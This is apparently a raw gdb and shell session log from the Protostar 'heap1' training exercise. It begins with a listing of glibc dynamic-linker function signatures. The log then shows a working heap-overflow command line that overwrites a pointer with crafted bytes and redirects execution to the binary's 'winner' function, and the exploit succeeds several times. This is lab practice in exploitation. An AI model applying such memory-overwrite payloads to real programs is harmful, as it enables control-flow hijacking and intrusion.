static _Bool cache_rpath(struct link_map *, struct r_search_path_struct *, int, const char *);
static _Bool decompose_rpath(struct r_search_path_struct *, const char *, struct link_map *, const char *);
static char *expand_dynamic_string_token(struct link_map *, const char *);
static struct r_search_path_elem **fillin_rpath(char *, struct r_search_path_elem **, const char *, int, const char *, const char *);
static size_t is_dst(const char *, const char *, const char *, int, int);
static char *local_strdup(const char *);
static void lose(int, int, const char *, char *, struct link_map *, const char *, struct r_debug *);
static int open_path(const char *, size_t, int, struct r_search_path_struct *, char **, struct filebuf *, struct link_map *, int, _Bool *);
static int open_verify(const char *, struct filebuf *, struct link_map *, int, _Bool *, _Bool);
static void print_search_path(struct r_search_path_elem **, const char *, const char *);

File dl-cache.c:
int _dl_cache_libcmp(const char *, const char *);
const char *_dl_load_cache_lookup(const char *);
void _dl_unload_cache(void);

File dl-lookup.c:
lookup_t _dl_lookup_symbol_x(const char *, struct link_map *, const Elf32_Sym **, struct r_scope_elem **, const struct r_found_version *, int, int, struct link_map *);
void _dl_setup_hash(struct link_map *);
static int do_lookup_x(uint_fast32_t, long unsigned int *, const Elf32_Sym *, struct sym_val *, struct r_scope_elem *, size_t, int, struct link_map *, struct link_map *);

File dl-object.c:
struct link_map *_dl_new_object(char *, const char *, int, struct link_map *, int, Lmid_t);

File dl-reloc.c:
void _dl_allocate_static_tls(struct link_map *);
void _dl_nothread_init_static_tls(struct link_map *);
void _dl_protect_relro(struct link_map *);
void _dl_reloc_bad_type(struct link_map *, unsigned int, int);
void _dl_relocate_object(struct r_scope_elem **, int, int);
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) x winner
0x8048494 <winner>:      "U\211\345\203\354\030\307\004$"
(gdb) now change add to 0000
Undefined command: "now".  Try "help".
(gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"

Breakpoint 1, main (argc=3, argv=0xbffff834) at heap1/heap1.c:23
23      in heap1/heap1.c
(gdb) c
Continuing.
and we have a winner @ 1588850574

Program exited with code 042.
(gdb) gotit
Undefined command: "gotit".  Try "help".
(gdb) ^Z
[2]+  Stopped                 gdb heap1
user@protostar:/opt/protostar/bin$ ./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1588850611
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ ./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1588850616
